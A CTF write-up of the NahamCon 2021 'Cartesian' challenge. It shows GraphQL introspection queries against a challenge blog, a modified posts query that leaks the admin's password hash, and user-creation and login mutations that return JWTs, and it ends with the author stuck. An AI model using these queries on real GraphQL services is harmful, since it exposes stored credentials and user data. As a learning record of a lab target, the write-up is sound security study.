# Nahamcon CTF 2021

## Cartesian

This challenge was part of the mission path.

The website is a blog kind of web UI. There's a graphql endpoint in `/graphql`. I didn't know about graphql and had to do my own research. There were quite a few past CTFs playing with this. [This resource](https://jaimelightfoot.com/blog/hack-in-paris-2019-ctf-meet-your-doctor-graphql-challenge/) was useful.

Turns out there are various ways to do instrospection, because the introspection features are still enabled on that challenge endpoint. For instance, querying for types returns:

```
"data":{"__schema":{"types":[{"name":"__TypeKind"},{"name":"__InputValue"},{"name":"__EnumValue"},{"name":"Query"},{"name":"Post"},{"name":"User"},{"name":"__Schema"},{"name":"__Type"},{"name":"__Directive"},{"name":"__DirectiveLocation"},{"name":"Mutation"},{"name":"Boolean"},{"name":"Int"},{"name":"String"},{"name":"Auth"},{"name":"__Field"}
```

I then looked for existing queries via the following request

```
{"query":"{__type(name: \"Query\") {name fields { name type { name kind }}}}"}
```

The output reveals there's a `flag` scalar in GraphQL:

```
{"name":"flag","type":{"kind":"SCALAR","name":"String"}},
```

However a `{flag}` query claims only the admin can read it.

I dumped fully the graphql (kudos to https://apis.guru/graphql-voyager/) and explored types and type comments. I noticed a `password` field on `User`, interesting. Since the admin had posted blogs on the instance, I just modified the blog retrieving query to also dump the admin password:


```
{
"operationName":"UserQuery","variables":{},"query":"query UserQuery {\n  posts {\n    id\n    name\n    image\n    content\n    author {\n      username\n     password  __typename\n    }\n    __typename\n  }\n}\n"
}
```

That query leaks out admin password: `52a9715ba147f750d0751aeccc22b8cc2ff7a9db`. The graphql comments on the User database hints that this is `sha1(password:seed)`

I then looked into graphql mutations:

```
{"query":"mutation {createUser(username: \"foo\", password:\"bar\"){id username password}}"}
```

Creates a User.

And:

```
{"query":"mutation {authenticateUser(username: \"foo\", password:\"bar\"){token}}"}
```

authenticates the user. Checking what's returned, it's a JWT token. (you present it with `Authentication: Bearer <token>`)

Summarizing:

* There's a flag that can be dumped if I present an Admin auth token.
* I know the admin hashed password and its format. I do not know the seed.
* I can create an arbitrary amount of users / passwords
* I can log in as those users
* I can post content as those users.
* Posting content does not seem to trigger loading of images or links behind the scenes.

I was stuck after that. Remaining ideas:

* Identify a graphql injection path.
* Get to the seed, then to the original admin password.
